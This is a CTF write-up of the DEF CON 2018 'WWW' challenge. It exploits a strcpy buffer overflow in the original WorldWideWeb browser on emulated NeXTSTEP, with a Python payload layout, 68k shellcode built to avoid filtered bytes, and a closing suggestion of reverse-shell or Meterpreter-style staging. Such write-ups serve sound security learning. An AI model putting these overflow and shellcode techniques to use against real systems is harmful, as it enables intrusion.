## Defcon 2018 Qualifiers - WWW Solution / Write-up

### tl;dr

The vulnerability exists in the function [HTParseInet, HTTCP.c:185](https://github.com/jtang613/WorldWideWeb/blob/62b3c9b5082e45534b256419f010de518ba1dd15/NextStep/Implementation/HTTCP.c#L185)
```C
char host[256];
////
strcpy(host, str); /* Take a copy we can mutilate */
```

This exploit overflows 'host' to redirect the return address to our shellcode on the stack. This shellcode in turn, sets up the stack with the local path to the flag 'file:///me/flag' and calls into HTOpenFile to return a file descriptor (rather than the expected socket). Since the eventual read() call is agnostic to whether it's reading a file descriptor or socket, we can now read and display the local file in the browser window.  A little bit of stack and variable massaging ensures enough stability to execute without crashing.

The important constraint on the shellcode is there must be no ** #  :  / or null  ** characters for it to deliver successfully.


![Screenshot](/screenshot.png?raw=true "Pwnd")

#### Aside

I am describing the initial approach I took. It was only much later that I realized that a ret2libc would be much simpler - chalk it up to lack of sleep. Ultimately, the ret2libc is what we used to solve the challenge, but it feels a bit less elegant than tricking the browser itself into displaying the flag. Plus, I was really close to having this work before the switch, and couldn't just leave it incomplete.

### Challenge Triage

The challenge hints: 
> From such humble beginnings does this 'web' spring forth to entangle us all: can you take the 'next' step? Flag format is nonstandard: defconctf{ } ddee3e1a.quals2018.oooverflow.io:31337.

Connecting to the game server we are presented with a prompt for a URL:
> Welcome to the pre-alpha web aka 520d462abb92809b4fa1eaaafabbaee4
> What URL would you like this old dog to fetch?

Entering a known-good URL such as http://www.google.com results in the message:
> Booting up
(after a short wait)

Eventually, we begin receiving messages and base64 encoded lines where upon completion, the connection is terminated remotely. Decoding the base64 lines reveals them to be PNG screenshots of the target, running the NeXTSTEP operating system on a Motorola 68000 class processor. First we watch it boot, then it opens a web browser (the very first web browser, WorldWideWeb, written by Tim Berners-Lee) and proceeds to open the URL we provided.

The base64 lines may be quickly parsed from the output using a Python script similar to:
```Python
i = 0
while True:
    line = r.readline()
    if line.startswith('DEBUG'):
        data = line.split(' ', 1)[1].decode('base64')
        with open('out%02d.png' % i, 'wb') as f:
            f.write(data)
        i += 1
```

Examining the output images closer reveals a file browser showing the home directory of the user 'me'. Interestingly, this directory contains a file named 'flag'! Thus, we have our target - we must somehow convince the browser to load the flag by providing it a valid URL.  

### First steps

The obvious choice is a non-starter:
> What URL would you like this old dog to fetch?  file:///me/flag
> Error, I only know http

It appears the game server is filtering the user-supplied URL before passing it to the browser. We must provide a URL starting with 'http://'.

Perhaps we can trick the browser into loading a crafted HTML page with an IFrame pointing to file:///me/flag?
Alas, this browser pre-dates IFrame support; likewise for IMG and other file inclusion candidates.

Remembering that this challange is in the 'pwn' category, we send:
> What URL would you like this old dog to fetch?  http://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

And this results in the browser immediately crashing.

This looks promising. We can infer that, by its age, that this browser likely includes what we might call *unsafe coding practices*. Now we need to isolate the crash, determine if it's indeed exploitable and if so, construct a payload to somehow deliver us the flag.

### Down the rabbit hole

NeXTSTEP is an early, BSD-based operating system for the PowerPC-based computers produced by NeXT Computer. Apple's OSX has a direct lineage back to NeXTSTEP. It was also the system of choice for John Carmack to develop the first Doom and Quake game engines on.  Additionally, in the late 1980's and early 1990's, a lone researcher at Cern going by the initials TBL created the first web browser, WorldWideWeb on a NeXT machine. 

In the years since NeXT's acquisition by Apple, a number of emulators, disk images and original source code have made it into the public domain, along with an active support community.  It didn't take long to come across the emulator *Previous* (get it?) along with a NeXTSTEP image and the WorldWideWeb source code.
* (https://github.com/probonopd/previous)
* (https://winworldpc.com/download/0c6a74c3-8e53-3f11-c3a4-c2a90f7054ef)
* (http://www.nextcomputers.org/NeXTfiles/Software/NEXTSTEP/Developer/)
* (https://github.com/cynthia/WorldWideWeb)

A few hours of strife later, we now have a NeXTSTEP system running the original WorldWideWeb browser under GDB that we can throw our payload at. An efficient workflow is to develop the exploit payload on the host, then deliver it to the guest over a network socket (simulating the live CTF). The guest, upon receiving the payload, can pipe it through the 'copy' command to make it available for pasting into the browser's 'Open Document' dialog.
```Python
# Running on guest os
import os, time, socket
last = ''
while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(('10.0.2.2', 1234))
        data = ''
        while True:
            line = s.recv(1024)
            if line == '':
                break
            data = data + line
        if data != last:
            last = data
            print data
            p = os.popen('copy', 'w')
            try:
                p.write(data)
            finally:
                p.close()
        s.close()
    except:
        s.close()
    time.sleep(1)
```

Examining the crash under GDB indeed indicates an overflow at: [HTParseInet, HTTCP.c:185](https://github.com/jtang613/WorldWideWeb/blob/62b3c9b5082e45534b256419f010de518ba1dd15/NextStep/Implementation/HTTCP.c#L185). In this case, the variable 'host' is a char array of size 256. Thus our test payload of 1024 A's clearly romped all over the stack, quickly resulting in the first crash.  What we need is something more structured and deliberate.

A quick view of the stack layout gives us a sense of the structure we're looking for:
![68k Stack Layout](/stack_layout.png?raw=true "68k Stack Layout")

The offending call to strcpy(host, str) that actually initiates the buffer overflow accepts our arbitrarily long input (char \*str), then attempts to copy it into a fixed-length buffer (char host[256]). So in this scenario, once we've copied all 256 bytes that is allocated to the 'host' parameter, the next bytes overflow first into the 'port' local variable (char \*port), then the previous frame's 'Frame Pointer', then into the return address of the callee.  It is the overwriting of this return address that turns the target computer into *our* computer.

So, the initial structure we're aiming for is:
```Python
import struct
p = ''
p += 'http://'                      # Pass the input validation check
p += 'A' * 256                      # Fill up host[256]
p += struct.pack('>I', 0xffffffff)  # Overwrite str
p += struct.pack('>I', 0x03fff680)  # Old FP
p += struct.pack('>I', 0x0000e34a)  # Return to where?
```

In delivering the payload above, we would expect to overwrite the return address with 0x0000e34a [HTTP_Get, HTTP.c:59](https://github.com/jtang613/WorldWideWeb/blob/62b3c9b5082e45534b256419f010de518ba1dd15/NextStep/Implementation/HTTP.c#L59)... For test purposes.  However, there is a problem - the return address contains null bytes, meaning strcpy() will terminate before copying the entire return address. No good. We need a return address with no null bytes. Further, examining the source code, we can see that there are other characters that will also interrupt the successful delivery of the payload: ** :  #  / ** all trigger additional processing.

Rewinding a bit - we still need to address the question of *where to return to?* Under the expected conditions, the browser will open a socket to the destination host, then construct an HTTP GET request that it will send prior to reading back the response from the socket. We also know that the browser can in fact parse a local URL of the form 'file://', hence the need for the initial input sanitization step. Can we use our ability to return to an address of our choice to somehow cause the browser to read and display the location 'file:///me/flag'. It turns out that yes, yes we can!

This operating system existed long before concepts such as non-executable stacks were common practice. Therefore, it's no problem for us to simply populate the 'host[256]' variable with some Motorola 68000 instructions and return into the stack! Then this code can set up the stack with our custom URL, then call into HTOpenFile and return back to the initial HTTP_Get, only now with a file descriptor rather than a network socket.

But... given the costraints mentioned, we must be mindful when constructing our shellcode not to include any bytes that will cause it to fail. In the case of the file path - containing several forward slashes - we will use arithmetic operations to calculate the intended value prior to using it. For example:
```
        ;  66696c65 3a2f2f2f 6d652f66 6c616700 -> "file:///me/flag\0"

;       move.l  #0x66696c65,(%a5)       ;  "file"  (not strictly necessary to use arith here)
        move.l  #0x78787878,%d4
        subi.l  #0x120f0c13,%d4
        move.l  %d4,(%a5)
        addq.l  #4,%a5

;       move.l  #0x3a2f2f2f,(%a5)       ;  ":///"
        move.l  #0x43434343,%d4
        subi.l  #0x09141414,%d4
        move.l  %d4,(%a5)
        addq.l  #4,%a5

;       move.l  #0x6d652f66,(%a5)       ;  "me/f"
        move.l  #0x78787878,%d4
        subi.l  #0x0b134912,%d4
        move.l  %d4,(%a5)
        addq.l  #4,%a5

;       move.l  #0x6c616700,(%a5)       ;  "lag\0"
        move.l  #0x78787878,%d4
        subi.l  #0x0c171178,%d4
        move.l  %d4,(%a5)
        addq.l  #4,%a5
```

Here we use the arbitrary values of 0x78787878 and 0x43434343 to subtract intermediate values in order to produce the intended value prior to storing it.

Similarly, for instructions and opcodes containing blacklisted bytes, we can swap registers or find subsitute instructions to achieve the desired result. This is noted in the final shellcode source file.

The final working solution was not arrived at as quickly as one might guess. A great deal of iteration, uncertainty and rework was required. One of the most frustrating was the final 'stack tweaks'.  When running under GDB, the exploit appeared stable, however when run against a standalone browser, it would crash. One reason for this was that the stack layout is offset ~0x228 between GDB and standalone. This was determined by attaching the debugger to the standalone instance rather than launching the browser from within the debugger. Upon adjusting the shellcode and FP addresses in the payload, it *still* crashed! Several hours of debug and experimentation would pass before it was determined that setting the 'Console Trace' flag would allow the standalone version to successfully run. It's likely that a more careful examination of the problem could address this in a cleaner way, but for this purpose it's an acceptable compromise.

### Next Steps  ;-)

It might be cool to adapt this shellcode to achieve a reverse-shell. The libc offsets for socket(), connect(), read(), write(), execve(), etc are easily determined. The trick may be memory management - a shellcode longer than 256 bytes will need to jmp over the critical return address before continuing. Likewise, one could implement a staged loader with a lightweight initial payload that itself retrieves and executes a more complicated payload (Meterpreter anyone?)


